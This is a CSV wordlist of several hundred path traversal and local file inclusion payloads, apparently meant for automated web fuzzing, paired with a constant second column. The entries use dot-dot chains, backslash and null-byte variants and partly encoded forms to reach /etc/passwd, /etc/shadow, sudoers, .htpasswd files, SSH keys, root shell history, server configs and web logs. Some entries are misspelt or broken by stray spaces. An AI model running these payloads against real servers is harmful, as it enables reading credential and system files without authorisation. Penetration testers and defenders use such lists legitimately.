Payload1,Payload2
../../../../../../../../../../../../../../etc/passwd,2
../../../../../../../../../../../../../etc/passwd,2
../../../../../../../../../../../../etc/passwd,2
../../../../../../../../../../../etc/passwd,2
../../../../../../../../../../etc/passwd,2
../../../../../../../../../etc/passwd,2
../../../../../../../../etc/passwd,2
../../../../../../../etc/passwd,2
../../../../../../etc/passwd,2
../../../../../etc/passwd,2
../../../../etc/passwd,2
../../../etc/passwd,2
../../etc/passwd,2
../etc/passwd,2
..\..\..\..\..\..\..\..\..\..\etc\passwd,2
.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd,2
\..\..\..\..\..\..\..\..\..\..\etc\passwd,2
etc/passwd,2
/etc/passwd%00,2
../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00,2
../../../../../../../../../../../../../../../../../../../../../etc/passwd%00,2
../../../../../../../../../../../../../../../../../../../../etc/passwd%00,2
../../../../../../../../../../../../../../../../../../../etc/passwd%00,2
../../../../../../../../../../../../../../../../../../etc/passwd%00,2
../../../../../../../../../../../../../../../../../etc/passwd%00,2
../../../../../../../../../../../../../../../../etc/passwd%00,2
../../../../../../../../../../../../../../../etc/passwd%00,2
../../../../../../../../../../../../../../etc/passwd%00,2
../../../../../../../../../../../../../etc/passwd%00,2
../../../../../../../../../../../../etc/passwd%00,2
../../../../../../../../../../../etc/passwd%00,2
../../../../../../../../../../etc/passwd%00,2
../../../../../../../../../etc/passwd%00,2
../../../../../../../../etc/passwd%00,2
../../../../../../../etc/passwd%00,2
../../../../../../etc/passwd%00,2
../../../../../etc/passwd%00,2
../../../../etc/passwd%00,2
../../../etc/passwd%00,2
../../etc/passwd%00,2
../etc/passwd%00,2
..\..\..\..\..\..\..\..\..\..\etc\passwd%00,2
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,2
/../../../../../../../../../../../etc/passwd%00.html,2
/../../../../../../../../../../../etc/passwd%00.jpg,2
../../../../../../etc/passwd&=%3C%3C%3C%3C,2
/etc/php4.4/fcgi/php.ini,2
/etc/php4/apache2/php.ini,2
/etc/php4/apache/php.ini,2
/etc/php4/cgi/php.ini,2
/etc/php5/apache2/php.ini,2
/etc/php5/apache/php.ini,2
/etc/php5/cgi/php.ini,2
/etc/php/apache2/php.ini,2
/etc/php/apache/php.ini,2
/etc/php/cgi/php.ini,2
/etc/php.d/dom.ini,2
/etc/php.d/gd.ini,2
/etc/php.d/imap.ini,2
/etc/php.d/json.ini,2
/etc/php.d/ldap.ini,2
/etc/php.d/mbstring.ini,2
/etc/php.d/mysqli.ini,2
/etc/php.d/mysql.ini,2
/etc/php.d/odbc.ini,2
/etc/php.d/pdo.ini,2
/etc/php.d/pdo_mysql.ini,2
/etc/php.d/pdo_odbc.ini,2
/etc/php.d/pdo_pgsql.ini,2
/etc/php.d/pdo_sqlite.ini,2
/etc/php.d/pgsql.ini,2
/etc/php.d/xmlreader.ini,2
/etc/php.d/xmlwriter.ini,2
/etc/php.d/xsl.ini,2
/etc/php.d/zip.ini,2
/etc/php.ini,2
/etc/php/php4/php.ini,2
/etc/php/php.ini,2
/etc/postfix/mydomains,2
/etc/proftp.conf,2
/etc/proftpd/modules.conf,2
/etc/protpd/proftpd.conf,2
/etc/pure-ftpd.conf,2
/etc/pureftpd.passwd,2
/etc/pureftpd.pdb,2
/etc/pure-ftpd/pure-ftpd.conf,2
/etc/pure-ftpd/pure-ftpd.pdb,2
/etc/pure-ftpd/pureftpd.pdb,2
/etc/release,2
/etc/resolv.conf,2
/etc/rpc,2
/etc/security/environ,2
/etc/security/failedlogin,2
/etc/security/group,2
/etc/security/lastlog,2
/etc/security/limits,2
/etc/security/passwd,2
/etc/security/user,2
/./././././././././././etc/shadow,2
/../../../../../../../../../../etc/shadow,2
/../../../../../../../../../../etc/shadow^^,2
/..\../..\../..\../..\../..\../..\../etc/shadow,2
/etc/shadow,2
../../../../../../../../../../../../etc/shadow,2
..\..\..\..\..\..\..\..\..\..\etc\shadow,2
.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow,2
\..\..\..\..\..\..\..\..\..\..\etc\shadow,2
../../../../../../../../../../../../../../../../../../../../../../etc/shadow%00,2
../../../../../../../../../../../../etc/shadow%00,2
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,2
\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,2
etc/shadow%00,2
/etc/ssh/sshd_config,2
/etc/sudoers,2
/etc/syslog.conf,2
/etc/syslogd.conf,2
/etc/system,2
/etc/updatedb.conf,2
/etc/utmp,2
/etc/vfstab,2
/etc/vhcs2/proftpd/proftpd.conf,2
/etc/vsftpd.chroot_list,2
/etc/vsftpd.conf,2
/etc/vsftpd/vsftpd.conf,2
/etc/wtmp,2
/etc/wu-ftpd/ftpaccess,2
/etc/wu-ftpd/ftphosts,2
/etc/wu-ftpd/ftpusers,2
/.forward,2
/home2\bin\stable\apache\php.ini,2
/home/apache/conf/httpd.conf,2
/home/apache/httpd.conf,2
/home\bin\stable\apache\php.ini,2
/.htpasswd,2
.htpasswd,2
../.htpasswd,2
../install.php,2
install.php,2
../../../../../../../../../../../../localstart.asp,2
../../../../../../../../../../../../localstart.asp%00,2
/log/miscDir/accesslog,2
/.logout,2
/logs/access_log,2
/logs/access.log,2
../../../../../logs/access.log,2
../../../../logs/access.log,2
../../../logs/access.log,2
../../logs/access.log,2
../logs/access.log,2
/logs/error_log,2
/logs/error.log,2
../../../../../logs/error.log,2
../../../../logs/error.log,2
../../../logs/error.log,2
../../logs/error.log,2
../logs/error.log,2
/logs/pure-ftpd.log,2
/master.passwd,2
member/.htpasswd,2
members/.htpasswd,2
/.netrc,2
/NetServer\bin\stable\apache\php.ini,2
/opt/apache2/conf/httpd.conf,2
/opt/apache/conf/httpd.conf,2
/opt/lampp/logs/access_log,2
/opt/lampp/logs/access.log,2
/opt/lampp/logs/error_log,2
/opt/lampp/logs/error.log,2
/opt/xampp/etc/php.ini,2
/opt/xampp/logs/access_log,2
/opt/xampp/logs/access.log,2
/opt/xampp/logs/error_log,2
/opt/xampp/logs/error.log,2
.pass,2
../.pass,2
pass.dat,2
passwd,2
/.passwd,2
.passwd,2
../.passwd,2
passwd.dat,2
/php4\php.ini,2
/php5\php.ini,2
/php\php.ini,2
/PHP\php.ini,2
/private/etc/httpd/httpd.conf,2
/private/etc/httpd/httpd.conf.default,2
/proc/cpuinfo,2
/proc/interrupts,2
/proc/loadavg,2
/proc/meminfo,2
/proc/mounts,2
/proc/net/arp,2
/proc/net/dev,2
/proc/net/route,2
/proc/net/tcp,2
/proc/partitions,2
/proc/self/cmdline,2
/proc/self/envron,2
/proc/version,2
/.profile,2
/Program Files\Apache Group\Apache2\conf\httpd.conf,2
/Program Files\Apache Group\Apache\conf\httpd.conf,2
/Program Files\Apache Group\Apache\logs\access.log,2
/Program Files\Apache Group\Apache\logs\error.log,2
/Program Files\xampp\apache\conf\httpd.conf,2
/../../../../pswd,2
/.rhosts,2
/root/.bash_history,2
/root/.bash_logut,2
root/.htpasswd,2
/root/.ksh_history,2
/root/.Xauthority,2
/.sh_history,2
/.shosts,2
/.ssh/authorized_keys,2
user/.htpasswd,2
../users.db.php,2
users.db.php,2
users/.htpasswd,2
/usr/apache2/conf/httpd.conf,2
/usr/apache/conf/httpd.conf,2
/usr/etc/pure-ftpd.conf,2
/usr/lib/cron/log,2
/usr/lib/php.ini,2
/usr/lib/php/php.ini,2
/usr/lib/security/mkuser.default,2
/usr/local/apache2/conf/httpd.conf,2
/usr/local/apache2/httpd.conf,2
/usr/local/apache2/logs/access_log,2
/usr/local/apache2/logs/access.log,2
/usr/local/apache2/logs/error_log,2
/usr/local/apache2/logs/error.log,2
/usr/local/apache/conf/httpd.conf,2
/usr/local/apache/conf/php.ini,2
/usr/local/apache/httpd.conf,2
/usr/local/apache/log,2
/usr/local/apache/logs,2
/usr/local/apache/logs/access_log,2
/usr/local/apache/logs/access_ log,2
/usr/local/apache/logs/access.log,2
/usr/local/apache/logs/access. log,2
../../../../../../../usr/local/apache/logs/access_ log,2
../../../../../../../usr/local/apache/logs/access. log,2
../../../../../usr/local/apache/logs/access_log,2
../../../../../usr/local/apache/logs/access.log,2
/usr/local/apache/logs/error_log,2
/usr/local/apache/logs/error.log,2
../../../../../../../usr/local/apache/logs/error_l og,2
../../../../../../../usr/local/apache/logs/error.l og,2
../../../../../usr/local/apache/logs/error_log,2
../../../../../usr/local/apache/logs/error.log,2
/usr/local/apps/apache2/conf/httpd.conf,2
/usr/local/apps/apache/conf/httpd.conf,2
/usr/local/cpanel/logs,2
/usr/local/cpanel/logs/access_log,2
/usr/local/cpanel/logs/error_log,2
/usr/local/cpanel/logs/license_log,2
/usr/local/cpanel/logs/login_log,2
/usr/local/cpanel/logs/stats_log,2
/usr/local/etc/apache2/conf/httpd.conf,2
/usr/local/etc/apache/conf/httpd.conf,2
/usr/local/etc/apache/vhosts.conf,2
/usr/local/etc/httpd/conf/httpd.conf,2
/usr/local/etc/httpd/logs/access_log,2
/usr/local/etc/httpd/logs/error_log,2
/usr/local/etc/php.ini,2
/usr/local/etc/pure-ftpd.conf,2
/usr/local/etc/pureftpd.pdb,2
/usr/local/httpd/conf/httpd.conf,2
/usr/local/lib/php.ini,2
/usr/local/php4/httpd.conf,2
/usr/local/php4/httpd.conf.php,2
/usr/local/php4/lib/php.ini,2
/usr/local/php5/httpd.conf,2
/usr/local/php5/httpd.conf.php,2
/usr/local/php5/lib/php.ini,2
/usr/local/php/httpd.conf,2
/usr/local/php/httpd.conf.php,2
/usr/local/php/lib/php.ini,2
/usr/local/pureftpd/etc/pure-ftpd.conf,2
/usr/local/pureftpd/etc/pureftpd.pdb,2
/usr/local/pureftpd/sbin/pure-config.pl,2
/usr/local/www/logs/thttpd_log,2
/usr/local/Zend/etc/php.ini,2
/usr/pkgsrc/net/pureftpd/,2
/usr/ports/contrib/pure-ftpd/,2
/usr/ports/ftp/pure-ftpd/,2
/usr/ports/net/pure-ftpd/,2
/usr/sbin/pure-config.pl,2
/usr/spool/lp/log,2
/usr/spool/mqueue/syslog,2
/var/adm,2
/var/adm/acct/sum/loginlog,2
/var/adm/aculog,2
/var/adm/aculogs,2
/var/adm/crash/unix,2
/var/adm/crash/vmcore,2
/var/adm/cron/log,2
/var/adm/dtmp,2
/var/adm/lastlog,2
/var/adm/lastlog/username,2
/var/adm/log/asppp.log,2
/var/adm/loginlog,2
/var/adm/log/xferlog,2
/var/adm/lp/lpd-errs,2
/var/adm/messages,2
/var/adm/pacct,2
/var/adm/qacct,2
/var/adm/ras/bootlog,2
/var/adm/ras/errlog,2
/var/adm/sulog,2
/var/adm/SYSLOG,2
/var/adm/utmp,2
/var/adm/utmpx,2
/var/adm/vold.log,2
/var/adm/wtmp,2
/var/adm/wtmpx,2
/var/adm/X0msgs,2
/var/apache/log,2
/var/apache/logs,2
/var/apache/logs/access_log,2
/var/apache/logs/error_log,2
/var/cpanel/cpanel.config,2
/var/cron/log,2
/var/lib/mlocate/mlocate.db,2
/var/lib/mysql/my.cnf,2
/var/local/www/conf/php.ini,2
/var/lock/samba,2
/var/log,2
/var/log/access_log,2
/var/log/access.log,2
../../../../../../../var/log/access_log,2
../../../../../../../var/log/access.log,2
../../../../../var/log/access_log,2
/var/log/acct,2
/var/log/apache2/access_log,2
/var/log/apache2/access.log,2
../../../../../../../var/log/apache2/access_log,2
../../../../../../../var/log/apache2/access.log,2
/var/log/apache2/error_log,2
/var/log/apache2/error.log,2
../../../../../../../var/log/apache2/error_log,2
../../../../../../../var/log/apache2/error.log,2
/var/log/apache/access_log,2
/var/log/apache/access.log,2
../../../../../../../var/log/apache/access_log,2
../../../../../../../var/log/apache/access.log,2
../../../../../var/log/apache/access_log,2
../../../../../var/log/apache/access.log,2
/var/log/apache/error_log,2
/var/log/apache/error.log,2
../../../../../../../var/log/apache/error_log,2
../../../../../../../var/log/apache/error.log,2
../../../../../var/log/apache/error_log,2
../../../../../var/log/apache/error.log,2
/var/log/apache-ssl/access.log,2
/var/log/apache-ssl/error.log,2
/var/log/auth,2
/var/log/authlog,2
/var/log/auth.log,2
/var/log/boot.log,2
/var/log/cron.log,2
/var/log/dmesg,2
/var/log/error_log,2
/var/log/error.log,2
../../../../../../../var/log/error_log,2
../../../../../../../var/log/error.log,2
../../../../../var/log/error_log,2
/var/log/exim_mainlog,2
/var/log/exim/mainlog,2
/var/log/exim_paniclog,2
/var/log/exim/paniclog,2
/var/log/exim_rejectlog,2
/var/log/exim/rejectlog,2
/var/log/ftplog,2
/var/log/ftp-proxy,2
/var/log/ftp-proxy/ftp-proxy.log,2
/var/log/httpd/,2
/var/log/httpd/access_log,2
/var/log/httpd/access.log,2
../../../../../var/log/httpd/access_log,2
/var/log/httpd/error_log,2
/var/log/httpd/error.log,2
../../../../../var/log/httpd/error_log,2
/var/log/httpsd/ssl.access_log,2
/var/log/httpsd/ssl_log,2
/var/log/kern.log,2
/var/log/lastlog,2
/var/log/lighttpd,2
/var/log/maillog,2
/var/log/message,2
/var/log/messages,2
/var/log/mysqlderror.log,2
/var/log/mysqld.log,2
/var/log/mysql.log,2
/var/log/mysql/mysql-bin.log,2
/var/log/mysql/mysql.log,2
/var/log/mysql/mysql-slow.log,2
/var/log/ncftpd.errs,2
/var/log/ncftpd/misclog.txt,2
/var/log/news,2
/var/log/news.all,2
/var/log/news/news,2
/var/log/news/news.all,2
/var/log/news/news.crit,2
/var/log/news/news.err,2
/var/log/news/news.notice,2
/var/log/news/suck.err,2
/var/log/news/suck.notice,2
/var/log/poplog,2
/var/log/POPlog,2
/var/log/proftpd,2
/var/log/proftpd.access_log,2
/var/log/proftpd.xferlog,2
/var/log/proftpd/xferlog.legacy,2
/var/log/pureftpd.log,2
/var/log/pure-ftpd/pure-ftpd.log,2
/var/log/qmail,2
/var/log/qmail/,2
/var/log/samba,2
/var/log/samba-log.%m,2
/var/log/secure,2
/var/log/smtpd,2
/var/log/spooler,2
/var/log/syslog,2
/var/log/telnetd,2
/var/log/thttpd_log,2
/var/log/utmp,2
/var/log/vsftpd.log,2
/var/log/wtmp,2
/var/log/xferlog,2
/var/log/yum.log,2
/var/lp/logs/lpNet,2
/var/lp/logs/lpsched,2
/var/lp/logs/requests,2
/var/mysql.log,2
/var/run/httpd.pid,2
/var/run/mysqld/mysqld.pid,2
/var/run/utmp,2
/var/saf/_log,2
/var/saf/port/log,2
/var/spool/errors,2
/var/spool/locks,2
/var/spool/logs,2
/var/spool/tmp,2
/var/www/conf/httpd.conf,2
/var/www/html/.htaccess,2
/var/www/localhost/htdocs/.htaccess,2
/var/www/log/access_log,2
/var/www/log/error_log,2
/../../var/www/logs/access_log,2
/var/www/logs/access_log,2
/var/www/logs/access.log,2
../../../../../../../var/www/logs/access_log,2
../../../../../../../var/www/logs/access.log,2
../../../../../var/www/logs/access.log,2
/var/www/logs/error_log,2
/var/www/logs/error.log,2
../../../../../../../var/www/logs/error_log,2
../../../../../../../var/www/logs/error.log,2
../../../../../var/www/logs/error_log,2
../../../../../var/www/logs/error.log,2
/var/www/sitename/htdocs/,2
/var/www/vhosts/sitename/httpdocs/.htaccess,2
/var/www/web1/html/.htaccess,2
/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf,2
/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf,2
/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf,2
/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php,2
/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php,2
/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php,2
/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini,2
/Volumes/webBackup/opt/apache2/conf/httpd.conf,2
/Volumes/webBackup/private/etc/httpd/httpd.conf,2
/Volumes/webBackup/private/etc/httpd/httpd.conf.default,2
/web/conf/php.ini,2
/WINDOWS\php.ini,2
../../windows/win.ini,2
/WINNT\php.ini,2
/..\..\..\..\..\..\winnt\win.ini,2
/www/logs/proftpd.system.log,2
/xampp\apache\bin\php.ini,2
/.Xauthority,2
..2fapache2flogs2ferror.log,2
..2fapache2flogs2faccess.log,2
..2f..2fapache2flogs2ferror.log,2
..2f..2fapache2flogs2faccess.log,2
..2f..2f..2fapache2flogs2ferror.log,2
..2f..2f..2fapache2flogs2faccess.log,2
..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2facces_log,2
..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2facces.log,2
..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2ferror_log,2
..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2ferror.log,2
..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2faccess_log,2
..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2faccess.log,2
..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2faccess_ log,2
..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2faccess. log,2
..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2faccess_log,2
..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22faccess_log,2
..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2faccess.log,2
..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22faccess.log,2
..2f..2f..2f..2f..2f..2f..2fvar2flog2faccess_log,2
